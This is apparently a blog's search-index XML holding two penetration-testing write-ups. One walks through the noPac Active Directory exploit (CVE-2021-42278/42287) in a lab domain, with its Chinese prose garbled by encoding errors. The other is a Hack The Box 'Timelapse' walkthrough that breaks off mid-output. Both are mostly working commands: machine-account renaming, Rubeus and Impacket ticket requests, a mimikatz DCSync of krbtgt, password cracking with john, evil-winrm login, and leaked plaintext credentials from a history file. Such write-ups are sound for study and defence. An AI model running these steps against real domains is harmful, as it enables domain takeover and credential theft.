<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2021-42278 &amp; CVE-2021-42287 (NoPac)</title>
      <link href="/posts/f80a473a.html"/>
      <url>/posts/f80a473a.html</url>
      
        <content type="html"><![CDATA[<h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>CVE-2021-42278ï¼Œæœºå™¨ç”¨æˆ·åº”å½“æ˜¯ <code>COMUPTER$</code> çš„å½¢å¼ï¼Œä½†æ˜¯å®é™…å¹¶æ²¡æœ‰éªŒè¯æœºå™¨è´¦å·æ˜¯å¦æœ‰ <code>$</code>ã€‚å¯¼è‡´æœºå™¨ç”¨æˆ·åå¯ä»¥è¢«æ¨¡æ‹Ÿå†’ç”¨</p><p>CVE-2021-42287ï¼Œä½¿ç”¨ COMPUTER çš„ TGT é€šè¿‡å¦ä¸€ä¸ªç”¨æˆ·å»è¯·æ±‚ COMPUTER è‡ªå·±çš„ ST æ—¶ï¼Œå°† TGT å‘é€ç»™ KDC åï¼Œå½“ KDC æ‰¾ä¸åˆ° COMPUTER æ—¶ï¼ŒKDC ä¼šå†æ¬¡å¯»æ‰¾ <code>computer$</code> çš„ STï¼Œä»è€Œè·å¾—äº† <code>computer$</code> çš„ STã€‚ä»è€Œè·å¾—äº† <code>computer$</code> çš„æƒé™</p><p>åˆ©ç”¨æ¡ä»¶ï¼šéœ€è¦å¯¹å±æ€§ <code>sAMAccountName</code> and <code>servicePrincipalName</code> æœ‰<strong>å†™æƒé™</strong></p><p>å¯ä»¥åˆ©ç”¨åŸŸå†…é»˜è®¤çš„ MAQ ç‰¹æ€§ï¼Œé»˜è®¤å…è®¸åŸŸè´¦æˆ·åˆ›å»º 10 ä¸ªæœºå™¨è´¦æˆ·ï¼Œè€Œåˆ›å»ºè€…å¯¹äºæœºå™¨è´¦æˆ·å…·æœ‰å†™æƒé™</p><blockquote><p>æŸ¥çœ‹ MAQ æ˜¯å¦æœ‰é™åˆ¶ï¼ŒæŸ¥çœ‹ LDAP ä¸­çš„ ms-ds-machineaccountquota å±æ€§</p></blockquote><p>æ”»å‡»æµç¨‹ï¼š</p><ol><li><p>åˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·ï¼Œè¿™åœ¨ä¹‹å‰çš„æ–‡ç« éƒ½æœ‰æ‰€æåŠï¼Œä½¿ç”¨ impacket çš„ <code>addcomputer.py</code> æˆ–æ˜¯ <code>powermad</code>ã€‚<code>addcomputer.py</code> æ˜¯åˆ©ç”¨ <code>SAMR åè®® </code> åˆ›å»ºæœºå™¨è´¦æˆ·ï¼Œè¿™ä¸ªæ–¹æ³•æ‰€åˆ›å»ºçš„æœºå™¨è´¦æˆ·æ²¡æœ‰ SPNï¼Œæ‰€ä»¥å¯ä»¥ä¸ç”¨æ¸…é™¤</p></li><li><p>æ¸…é™¤æœºå™¨è´¦æˆ·çš„ <code>servicePrincipalName</code> å±æ€§</p></li><li><p>å°†æœºå™¨è´¦æˆ·çš„ <code>sAMAccountName</code>ï¼Œæ›´æ”¹ä¸º DC çš„æœºå™¨è´¦æˆ·åå­—ï¼Œæ³¨æ„åç¼€ä¸å¸¦$</p></li><li><p>ä¸ºæœºå™¨è´¦æˆ·è¯·æ±‚ TGT</p></li><li><p>å°†æœºå™¨è´¦æˆ·çš„ <code>sAMAccountName</code> æ›´æ”¹ä¸ºå…¶ä»–åå­—ï¼Œä¸ä¸æ­¥éª¤ 3 é‡å¤å³å¯</p></li><li><p>é€šè¿‡ S4U2self åè®®å‘ DC è¯·æ±‚ ST</p></li><li><p>DCsync</p></li></ol><p>ç¤ºä¾‹</p><p>å‡å¦‚åŸŸå†…æœ‰ä¸€å°åŸŸæ§åä¸º DCï¼ˆåŸŸæ§å¯¹åº”çš„æœºå™¨ç”¨æˆ·ä¸º <code>DC$</code>ï¼‰ï¼Œæ­¤æ—¶æ”»å‡»è€…åˆ©ç”¨æ¼æ´ CVE-2021-42287 åˆ›å»ºä¸€ä¸ªæœºå™¨ç”¨æˆ· <code>SAMTHEADMIN-48$</code>ï¼Œå†æŠŠæœºå™¨ç”¨æˆ· <code>SAMTHEADMIN-48$</code> çš„ <code>sAMAccountName</code> æ”¹æˆ <code>DC</code></p><p>ç„¶ååˆ©ç”¨ <code>DC</code> å»ç”³è¯·ä¸€ä¸ª TGT ç¥¨æ®ã€‚å†æŠŠ <code>DC</code> çš„ <code>sAMAccountName</code> æ”¹ä¸º <code>SAMTHEADMIN-48$</code>ã€‚è¿™ä¸ªæ—¶å€™ KDC å°±ä¼šåˆ¤æ–­åŸŸå†…æ²¡æœ‰ <code>DC</code> è¿™ä¸ªç”¨æˆ·ï¼Œè‡ªåŠ¨å»æœç´¢ <code>DC$</code>ï¼ˆ<code>DC$</code> æ˜¯åŸŸå†…å·²ç»çš„åŸŸæ§ DC çš„ <code>sAMAccountName</code>ï¼‰ï¼Œæ”»å‡»è€…åˆ©ç”¨åˆšåˆšç”³è¯·çš„ TGT è¿›è¡Œ S4U2selfï¼Œæ¨¡æ‹ŸåŸŸå†…çš„åŸŸç®¡å»è¯·æ±‚åŸŸæ§ DC çš„ ST ç¥¨æ®ï¼Œæœ€ç»ˆè·å¾—åŸŸæ§åˆ¶å™¨ DC çš„æƒé™</p><h1 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h1><h2 id="æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨"><a href="#æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨" class="headerlink" title="æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨"></a>æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨</h2><p>è¿™é‡Œåˆ©ç”¨ <a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a> ä¸­çš„ scaner.py æ¥æ£€æµ‹</p><p>![Pasted image 20220910171113.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910171113.png)</p><p>å¯ä»¥çœ‹åˆ°å¯ä»¥è¯·æ±‚ä¸åŒ…å« PAC çš„ TGTï¼Œæ‰€ä»¥è¯¥åŸŸæ§å¯ä»¥è¢«æ”»å‡»</p><h2 id="æ‰‹å·¥å¤ç°"><a href="#æ‰‹å·¥å¤ç°" class="headerlink" title="æ‰‹å·¥å¤ç°"></a>æ‰‹å·¥å¤ç°</h2><p>è¿™é‡Œä½¿ç”¨ äº† <code>powermad</code> å’Œ <code>PowerView</code> è„šæœ¬</p><p>åˆ›å»ºæœºå™¨è´¦æˆ·</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$password</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token string">'1qaz2wsx'</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token function">New-MachineAccount</span> <span class="token operator">-</span>MachineAccount <span class="token string">"NewEvilMachine"</span> <span class="token operator">-</span>Password $<span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">-</span>Domain <span class="token string">"merak.local"</span> <span class="token operator">-</span>DomainController <span class="token string">"DC.merak.local"</span> <span class="token operator">-</span>Verbose</code></pre><p>![Pasted image 20220910175306.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910175306.png)</p><p>æ¸…é™¤æ–°å»ºæœºå™¨è´¦æˆ·çš„ SPN</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-DomainObject</span> <span class="token string">"CN=NewEvilMachine,CN=Computers,DC=merak,DC=local"</span> <span class="token operator">-</span>Clear <span class="token string">'serviceprincipalname'</span> <span class="token operator">-</span>Verbose</code></pre><p>![Pasted image 20220910202352.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910202352.png)</p><p>ä¿®æ”¹æœºå™¨è´¦æˆ·çš„ç”¨æˆ·åä¸ºåŸŸæ§çš„ç”¨æˆ·åï¼Œæ³¨æ„ä¸å¸¦ <code>$</code></p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-MachineAccountAttribute</span> <span class="token operator">-</span>MachineAccount <span class="token string">"NewEvilMachine"</span> <span class="token operator">-</span>Value <span class="token string">"DC"</span> <span class="token operator">-</span>Attribute samaccountname <span class="token operator">-</span>Verbose</code></pre><p>![Pasted image 20220910203110.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910203110.png)</p><p>è¯·æ±‚ TGT</p><pre class="language-bashDC" data-language="bashDC"><code class="language-bashDC">Rubeus.exe asktgt &#x2F;user:&quot;DC&quot; &#x2F;password:&quot;1qaz2wsx&quot; &#x2F;domain:&quot;merak.local&quot; &#x2F;dc:&quot;DC.merak.local&quot; &#x2F;nowrap</code></pre><p>![Pasted image 20220910210604.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910210604.png)</p><p>æ¢å¤æœºå™¨è´¦æˆ·åŸç”¨æˆ·å</p><pre class="language-powershwll" data-language="powershwll"><code class="language-powershwll">Set-MachineAccountAttribute -MachineAccount &quot;NewEvilMachine&quot; -Value &quot;NewEvilMachine&quot; -Attribute samaccountname -Verbose</code></pre><p>![Pasted image 20220910212231.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910212231.png)</p><p>ä½¿ç”¨è¯·æ±‚çš„ TGT é€šè¿‡ S4U2self è·å– ST</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">Rubeus<span class="token punctuation">.</span>exe s4u <span class="token operator">/</span>self <span class="token operator">/</span>impersonateuser:<span class="token string">"administrator"</span> <span class="token operator">/</span>altservice:<span class="token string">"ldap/DC.merak.local"</span> <span class="token operator">/</span>dc:<span class="token string">"DC.merak.local"</span> <span class="token operator">/</span>ptt <span class="token operator">/</span>ticket:<span class="token namespace">[Base64 TGT]</span></code></pre><p>![Pasted image 20220910212825.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910212825.png)</p><p>éªŒè¯</p><p>![Pasted image 20220910213055.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910213055.png)</p><p>DCSync</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"lsadump::dcsync /domain:merak.local /kdc:DC.merak.local /user:krbtgt"</span> <span class="token string">"exit"</span></code></pre><p>![Pasted image 20220910213342.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910213342.png)</p><h2 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h2><p>åˆ›å»ºæœºå™¨è´¦æˆ·</p><pre class="language-bash" data-language="bash"><code class="language-bash">python addcomputer.py -dc-ip <span class="token number">10.0</span>.100.10 -computer-name <span class="token string">'ImpacketEvilMachine$'</span> -computer-pass <span class="token string">'1qaz2wsx'</span> -dc-host DC -domain-netbios DC <span class="token string">'merak.local/xzz:Password123'</span></code></pre><p>![Pasted image 20220910214341.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910214341.png)</p><p>æ¸…é™¤ SPN</p><p>addspn.py å‡ºè‡ª <a href="https://github.com/dirkjanm/krbrelayx">https://github.com/dirkjanm/krbrelayx</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">python addspn.py -u <span class="token string">'merak\xzz'</span> -p <span class="token string">'Password123'</span> -t <span class="token string">'ImpacketEvilMachine$'</span> -c DC.merak.local</code></pre><p>![Pasted image 20220910215313.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910215313.png)</p><p>ä¿®æ”¹æœºå™¨è´¦æˆ·ç”¨æˆ·å</p><p><a href="https://github.com/ShutdownRepo/impacket/blob/CVE-2021-42278/examples/renameMachine.py">https://github.com/ShutdownRepo/impacket/blob/CVE-2021-42278/examples/renameMachine.py</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">python renameMachine.py -current-name <span class="token string">'ImpacketEvilMachine$'</span> -new-name <span class="token string">'DC'</span> -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/xzz:Password123'</span></code></pre><p>![Pasted image 20220910220735.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910220735.png)</p><p>è¯·æ±‚ TGT</p><pre class="language-bash" data-language="bash"><code class="language-bash">python getTGT.py -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/DC:1qaz2wsx'</span></code></pre><p>![Pasted image 20220910223444.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910223444.png)</p><p>æ¢å¤æœºå™¨è´¦æˆ·ç”¨æˆ·å</p><pre class="language-bash" data-language="bash"><code class="language-bash">python renameMachine.py -current-name <span class="token string">'DC'</span> -new-name <span class="token string">'ImpacketEvilMachine$'</span> -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/xzz:Password123'</span></code></pre><p>![Pasted image 20220910221237.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910221237.png)</p><p>ä½¿ç”¨è¯·æ±‚çš„ TGT é€šè¿‡ S4U2self è·å– ST</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span><span class="token string">'DC.ccache'</span>python getST.py -impersonate <span class="token string">'administrator'</span> -spn <span class="token string">'cifs/DC.merak.local'</span> -k -no-pass -dc-ip <span class="token string">'DC.merak.local'</span> <span class="token string">'merak.local/DC'</span></code></pre><p>å¤±è´¥ï¼ŒåŸå› æš‚æœªå¯çŸ¥</p><p>![Pasted image 20220911110934.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220911110934.png)</p><p>é™„ä¸€ä¸ªæˆåŠŸçš„æˆªå›¾</p><p>![Pasted image 20220911111232.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220911111232.png)</p><h2 id="noPac"><a href="#noPac" class="headerlink" title="noPac"></a>noPac</h2><p><a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">python noPac.py merak.local/zs:<span class="token string">'Password123'</span> -dc-ip DC.merak.local -shell --impersonate administrator </code></pre><p>![Pasted image 20220910230856.png](CVE-2021-42278-&amp;-CVE-2021-42287-NoPac&#x2F;Pasted image 20220910230856.png)</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://tttang.com/archive/1380">https://tttang.com/archive/1380</a></p><p><a href="https://xz.aliyun.com/t/10666">https://xz.aliyun.com/t/10666</a></p><p><a href="https://xz.aliyun.com/t/10694">https://xz.aliyun.com/t/10694</a></p><p><a href="https://github.com/SecureAuthCorp/impacket/pull/1224">https://github.com/SecureAuthCorp/impacket/pull/1224</a></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Timelapse</title>
      <link href="/posts/628d110.html"/>
      <url>/posts/628d110.html</url>
      
        <content type="html"><![CDATA[<h1 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h1><p>There is no Chinese input method in kali, please forgive my English level</p><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><pre class="language-none"><code class="language-none">â”Œâ”€â”€(rootğŸ’€kali)-[~]    â””â”€# nmap -sC -sV -T4 10.10.11.152                                                                                                                        1 âš™Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-08 16:17 CSTNmap scan report for 10.10.11.152Host is up (0.58s latency).Not shown: 989 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION53&#x2F;tcp   open  domain        Simple DNS Plus88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-08 16:19:48Z)135&#x2F;tcp  open  msrpc         Microsoft Windows RPC139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)445&#x2F;tcp  open  microsoft-ds?464&#x2F;tcp  open  kpasswd5?593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636&#x2F;tcp  open  tcpwrapped3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)3269&#x2F;tcp open  tcpwrappedService Info: Host: DC01; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windowsHost script results:|_clock-skew: 8h01m34s| smb2-security-mode: |   3.1.1: |_    Message signing enabled and required| smb2-time: |   date: 2022-04-08T16:20:31|_  start_date: N&#x2F;AService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 135.90 seconds</code></pre><p>Add domain <code>timelapse.htb</code> to <code>etc/hosts</code></p><h2 id="Out-of-domain-username-enumeration"><a href="#Out-of-domain-username-enumeration" class="headerlink" title="Out-of-domain username enumeration"></a>Out-of-domain username enumeration</h2><pre class="language-none"><code class="language-none">â”Œâ”€â”€(rootğŸ’€kali)-[&#x2F;opt&#x2F;tools&#x2F;domain_tools]â””â”€# .&#x2F;kerbrute userenum -d timelapse.htb &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Usernames&#x2F;top-usernames-shortlist.txt --dc 10.10.11.152                                     1 âš™    __             __               __        &#x2F; &#x2F;_____  _____&#x2F; &#x2F;_  _______  __&#x2F; &#x2F;____   &#x2F; &#x2F;&#x2F;_&#x2F; _ \&#x2F; ___&#x2F; __ \&#x2F; ___&#x2F; &#x2F; &#x2F; &#x2F; __&#x2F; _ \ &#x2F; ,&lt; &#x2F;  __&#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;_&#x2F;  __&#x2F;&#x2F;_&#x2F;|_|\___&#x2F;_&#x2F;  &#x2F;_.___&#x2F;_&#x2F;   \__,_&#x2F;\__&#x2F;\___&#x2F;                                        Version: v1.0.3 (9dad6e1) - 04&#x2F;08&#x2F;22 - Ronnie Flathers @ropnop2022&#x2F;04&#x2F;08 16:50:09 &gt;  Using KDC(s):2022&#x2F;04&#x2F;08 16:50:09 &gt;   10.10.11.152:882022&#x2F;04&#x2F;08 16:50:10 &gt;  [+] VALID USERNAME:       guest@timelapse.htb2022&#x2F;04&#x2F;08 16:50:10 &gt;  [+] VALID USERNAME:       administrator@timelapse.htb2022&#x2F;04&#x2F;08 16:50:11 &gt;  Done! Tested 17 usernames (2 valid) in 1.377 seconds</code></pre><h2 id="smbmap"><a href="#smbmap" class="headerlink" title="smbmap"></a>smbmap</h2><pre class="language-none"><code class="language-none">â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ smbmap -H 10.10.11.152 -u guest[+] IP: 10.10.11.152:445        Name: timelapse.htb                                             Disk                                                    Permissions     Comment        ----                                                    -----------     -------        ADMIN$                                                  NO ACCESS       Remote Admin        C$                                                      NO ACCESS       Default share        IPC$                                                    READ ONLY       Remote IPC        NETLOGON                                                NO ACCESS       Logon server share         Shares                                                  READ ONLY        SYSVOL                                                  NO ACCESS       Logon server share</code></pre><p>using the smbmap can found <code>Shares</code> have read privilege</p><p>try to login with guest by smbclient, there have a backup zip file</p><pre class="language-none"><code class="language-none">â”Œâ”€â”€(rootğŸ’€kali)-[&#x2F;opt&#x2F;tools&#x2F;domain_tools]â””â”€# smbclient -U guest -W timelapse.htb &#x2F;&#x2F;timelapse.htb&#x2F;Shares                                                                                     130 â¨¯ 1 âš™Enter TIMELAPSE.HTB\guest&#39;s password: Try &quot;help&quot; to get a list of possible commands.smb: \&gt; ls  .                                   D        0  Mon Oct 25 23:39:15 2021  ..                                  D        0  Mon Oct 25 23:39:15 2021  Dev                                 D        0  Tue Oct 26 03:40:06 2021  HelpDesk                            D        0  Mon Oct 25 23:48:42 2021                6367231 blocks of size 4096. 1382234 blocks availablesmb: \&gt; cd devsmb: \dev\&gt; ls  .                                   D        0  Tue Oct 26 03:40:06 2021  ..                                  D        0  Tue Oct 26 03:40:06 2021  winrm_backup.zip                    A     2611  Mon Oct 25 23:46:42 2021                6367231 blocks of size 4096. 1382218 blocks available</code></pre><p>get it!</p><h2 id="Brute-password"><a href="#Brute-password" class="headerlink" title="Brute password"></a>Brute password</h2><p>unzip the backup file need password</p><p>so, I should find the password at first</p><pre class="language-none"><code class="language-none">â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ zip2john winrm_backup.zip &gt; hash.txt                   â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ john hash.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt Using default input encoding: UTF-8Loaded 1 password hash (PKZIP [32&#x2F;64])Will run 4 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statussupremelegacy    (winrm_backup.zip&#x2F;legacyy_dev_auth.pfx)     1g 0:00:00:00 DONE (2022-04-08 17:54) 3.846g&#x2F;s 13359Kp&#x2F;s 13359Kc&#x2F;s 13359KC&#x2F;s surki..superkeep16Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed</code></pre><p>get password <code>supremelegacy</code></p><p>unzip the to get <code>legacyy_dev_auth.pfx</code> file. This file also should password to open, using john too</p><pre class="language-none"><code class="language-none">python pfx2john.py ~&#x2F;legacyy_dev_auth.pfx &gt; ~&#x2F;pfx_hash.txtjohn pfx_hash.txt --format&#x3D;pfx --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</code></pre><p>get password: <code>thuglegacy</code></p><p>unlock the pfx file, I found a file named <code>Legacyy</code> in it, and the name is a vaild username in kerberos</p><pre class="language-none"><code class="language-none">    __             __               __        &#x2F; &#x2F;_____  _____&#x2F; &#x2F;_  _______  __&#x2F; &#x2F;____   &#x2F; &#x2F;&#x2F;_&#x2F; _ \&#x2F; ___&#x2F; __ \&#x2F; ___&#x2F; &#x2F; &#x2F; &#x2F; __&#x2F; _ \ &#x2F; ,&lt; &#x2F;  __&#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;  &#x2F; &#x2F;_&#x2F; &#x2F; &#x2F;_&#x2F;  __&#x2F;&#x2F;_&#x2F;|_|\___&#x2F;_&#x2F;  &#x2F;_.___&#x2F;_&#x2F;   \__,_&#x2F;\__&#x2F;\___&#x2F;                                        Version: v1.0.3 (9dad6e1) - 04&#x2F;08&#x2F;22 - Ronnie Flathers @ropnop2022&#x2F;04&#x2F;08 18:49:18 &gt;  Using KDC(s):2022&#x2F;04&#x2F;08 18:49:18 &gt;   10.10.11.152:882022&#x2F;04&#x2F;08 18:49:18 &gt;  [+] VALID USERNAME:       Legacyy@timelapse.htb2022&#x2F;04&#x2F;08 18:49:18 &gt;  Done! Tested 1 usernames (1 valid) in 0.320 seconds</code></pre><h1 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h1><p>I try to brute legacyyâ€™s password by kerbrute, but fail</p><p>so, let back to where we started. We found a backup file, which name is <code>winrm_backup.zip</code>. Unzip the compressed file, We get the <code>legacyy_dev_auth.pfx</code></p><p>Maybe the winrm is a component or service in windows. I try to search it in google and I get the explain by Microsoft.</p><blockquote><p>Windows Remote Management (WinRM) is the Microsoft implementation of WS-Management Protocol, a standard Simple Object Access Protocol (SOAP)-based, firewall-friendly protocol that allows hardware and operating systems, from different vendors, to interoperate.</p></blockquote><p>I consider the winrm is similar to SSH. So the credentials are also required.</p><p>As we all know, the pfx file usually contains the X.509 certificate and private key, and the <code>legacyy_dev_auth.pfx</code> we havenâ€™t use yet. So I think the pfx can be used for authentication in winrm. Letâ€™s separate the private key and X.509 certficate from the pfx file.</p><pre class="language-bash" data-language="bash"><code class="language-bash">openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out Legacyy.pemopenssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out cert.key -nodes</code></pre><p>Now, the problem is how to connect windows by winrm in linux (kali). I found a tool named <code>evil-winrm</code> in <a href="https://github.com/Hackplayers/evil-winrm">github</a>, which can connect to remote computer by winrm and use certificates for Authentication. Installation is simple in kali: <code>sudo apt-get install evil-winrm</code></p><p>Letâ€™s connect!</p><pre class="language-bash" data-language="bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>kaliã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>â””â”€$ evil-winrm -i <span class="token number">10.10</span>.11.152 -S -c Legacyy.pem -k cert.key Evil-WinRM shell v3.3Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machineData: For <span class="token function">more</span> information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>Warning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>legacyy<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>timelapse<span class="token punctuation">\</span>legacyy</code></pre><p>get user flag in <code>c:\users\legacyy\desktop\user.txt</code></p><h1 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h1><p>After a long and futile enumeration, Prompted by <code>pyp</code> in <a href="https://forum.hackthebox.com/t/official-timelapse-discussion/254385/4?u=k0to">forum</a> and this <a href="https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html">blog</a>, I found the powershell history file</p><pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>legacyy<span class="token punctuation">\</span>appdata<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>PowerShell<span class="token punctuation">\</span>PSReadLine<span class="token operator">></span> <span class="token builtin class-name">type</span> ConsoleHost_history.txt<span class="token function">whoami</span>ipconfig /all<span class="token function">netstat</span> -ano <span class="token operator">|</span>select-string LIST<span class="token variable">$so</span> <span class="token operator">=</span> New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck<span class="token variable">$p</span> <span class="token operator">=</span> ConvertTo-SecureString <span class="token string">'E3R$Q62^12p7PLlC%KWaxuaV'</span> -AsPlainText -Force<span class="token variable">$c</span> <span class="token operator">=</span> New-Object System.Management.Automation.PSCredential <span class="token punctuation">(</span><span class="token string">'svc_deploy'</span>, <span class="token variable">$p</span><span class="token punctuation">)</span>invoke-command -computername localhost -credential <span class="token variable">$c</span> -port <span class="token number">5986</span> -usessl -SessionOption <span class="token variable">$so</span> -scriptblock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span>get-aduser -filter * -properties *<span class="token builtin class-name">exit</span></code></pre><p>WOW, there have svc_deployâ€™s credentials. following the history commands, we can execute commands as svc_deploy user</p><pre class="language-none"><code class="language-none">GROUP INFORMATION-----------------Group Name                                  Type             SID                                          Attributes&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled groupBUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, 